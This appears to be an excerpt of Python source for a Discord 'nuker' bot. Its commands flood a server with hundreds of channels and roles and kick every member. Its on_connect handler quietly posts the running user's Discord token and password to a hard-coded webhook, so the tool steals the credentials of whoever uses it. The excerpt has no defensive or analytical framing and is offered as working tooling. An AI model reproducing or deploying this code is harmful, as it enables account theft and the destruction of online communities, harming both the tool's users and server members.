...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/783435302428999691/lgXxTwRBHnPQaEzVSP6rwElR7X0CrUsLdNma0Q7-8Rys5mzPPnyucaR1a7n5qr9E33rM',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()            
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(400):
        await ctx.guild.create_text_channel(name="Jayceez")
    for _i in range(400):
        await ctx.guild.create_role(name="Heartless", color=RandomColor())
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="jayceez")
        except:
            pass
...
async def massrole(ctx):
    ...
    for _i in range(300):
        try:
            await ctx.guild.create_role(name="jayceez", color=RandomColor())
        except:
            return
...
async def spamchannels(ctx):
    ...
    for _i in range(400):
        try:
            await ctx.guild.create_text_channel(name="No Mercy Jayceez")
        except:
            return
